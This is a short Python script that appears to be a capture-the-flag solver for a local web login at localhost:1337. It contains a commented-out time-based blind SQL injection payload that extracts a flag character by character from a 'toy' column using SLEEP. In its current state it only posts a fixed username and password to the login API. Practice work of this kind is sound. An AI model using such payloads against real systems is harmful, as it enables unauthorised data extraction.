#!/usr/bin/python3
import string

from requests import post

char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + '{' + '}'  


url = "http://localhost:1337/"

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36","Content-Type":"application/json"}

flag = ''

# while not flag.endswith("}"):
# 	for char in char_set:
pos = len(flag) + 1
char = 'H'
#payload = {"username":f"admin AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(toy, {pos}, 1) FROM toydb.toylist WHERE id=7) = '{char}', SLEEP(3), 0))))x)-- wxyg","password":"a"}

json = {"username":"admin","password":"tryharder"}

r = post(url + "api/login", data=json)

print(r.text)